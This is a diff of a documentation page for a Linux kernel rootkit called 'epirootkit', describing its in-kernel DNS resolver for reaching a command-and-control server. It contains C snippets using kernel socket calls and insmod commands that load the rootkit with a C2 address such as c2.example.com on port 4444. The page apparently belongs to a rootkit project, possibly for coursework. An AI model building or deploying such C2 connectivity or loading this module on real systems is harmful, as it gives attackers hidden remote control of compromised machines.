@@ -11,72 +11,69 @@ weight: 514
 
 # DNS Resolution
 
-The rootkit includes a kernel-space DNS resolver that resolves domain names to IP addresses for C2 server connections.
+Kernel-space DNS resolver for flexible C2 server connections using domain names.
 
-## Overview
+## How It Works
 
-The DNS resolver:
-- Resolves domain names to IP addresses in kernel space
-- Uses UDP DNS queries to 8.8.8.8
-- Automatically falls back to direct IP if address is already an IP
-- Supports A record queries for IPv4 addresses
+1. **Detect address type** - IP vs domain name
+2. **Create UDP socket** in kernel space
+3. **Query 8.8.8.8:53** with A record lookup
+4. **Parse response** and extract IPv4 address
 
 ## Implementation
 
-### Files
-- `rootkit/network/dns_resolver.c` - DNS client implementation
-- `rootkit/network/dns_resolver.h` - API header
-
-### Key Function
-
 ```c
-int kernel_dns_resolve(const char *hostname, u32 *ip_addr);
+int kernel_dns_resolve(const char *hostname, u32 *ip_addr)
+{
+    // Create UDP socket
+    sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
+    
+    // Build DNS query packet
+    dns_query = build_dns_query(hostname);
+    
+    // Send to 8.8.8.8:53
+    kernel_sendmsg(sock, &msg, iov, 1, query_len);
+    
+    // Receive and parse response
+    kernel_recvmsg(sock, &msg, MSG_WAITALL);
+    *ip_addr = parse_dns_response(response_buf);
+    
+    sock_release(sock);
+    return 0;
+}
 ```
 
-**Parameters:**
-- `hostname`: Domain name to resolve
-- `ip_addr`: Pointer to store resolved IP (network byte order)
+## Usage
 
-**Returns:** 0 on success, negative error code on failure
+### Domain Name Configuration
+```bash
+# Use domain name for C2 server
+sudo insmod epirootkit.ko address=c2.example.com port=4444
+```
 
-### Process
+### IP Address (bypasses DNS)
+```bash
+# Direct IP connection
+sudo insmod epirootkit.ko address=192.168.1.100 port=4444
+```
 
-1. Create UDP socket in kernel space
-2. Build DNS query packet (A record lookup)
-3. Send query to 8.8.8.8:53
-4. Parse response and extract IPv4 address
+## Integration
 
-### Integration
-
-The socket connection code automatically detects IP vs domain:
-
+Automatic detection in socket connection:
 ```c
 if (!in4_pton(config.address, -1, (u8*)&server_addr.sin_addr.s_addr, -1, NULL)) {
-    /* Not an IP - resolve domain */
+    // Not an IP - resolve domain
     ret = kernel_dns_resolve(config.address, &target_ip);
     if (ret < 0) return ret;
     server_addr.sin_addr.s_addr = target_ip;
 }
 ```
 
-## Usage
-
-### Domain name:
-```bash
-sudo insmod epirootkit.ko address=c2.example.com port=4444
-```
-
-### IP address (bypasses DNS):
-```bash
-sudo insmod epirootkit.ko address=192.168.1.100 port=4444
-```
-
 ## Technical Details
 
-### DNS Protocol
-- Protocol: UDP
-- Server: 8.8.8.8:53
-- Query type: A records only
-- Query ID: 0x1234 (static)
-- Buffer size: 256 bytes
+- **Protocol**: UDP DNS queries
+- **Server**: 8.8.8.8:53 (Google DNS)
+- **Query type**: A records (IPv4) only
+- **Buffer size**: 256 bytes
+- **Fallback**: Direct IP if resolution fails
 
